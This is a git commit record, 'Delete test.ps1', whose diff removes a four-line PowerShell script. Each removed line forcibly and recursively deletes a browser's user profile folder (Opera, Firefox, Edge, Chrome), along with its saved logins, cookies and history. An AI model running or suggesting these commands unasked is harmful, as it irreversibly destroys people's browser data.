cf833555a3adc6dc1c44f00f8a061caf2db50346
VVolfCZ <83589607+VVolfCZ@users.noreply.github.com>
2023-03-25 13:42:20 +0100

    Delete test.ps1

--- test.ps1
+++
@@ -1,4 +0,0 @@
-Remove-Item "$env:APPDATA\Opera Software\Opera Stable" -Recurse -Force
-Remove-Item "$env:APPDATA\Mozilla\Firefox\Profiles" -Recurse -Force
-Remove-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Recurse -Force
-Remove-Item "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force
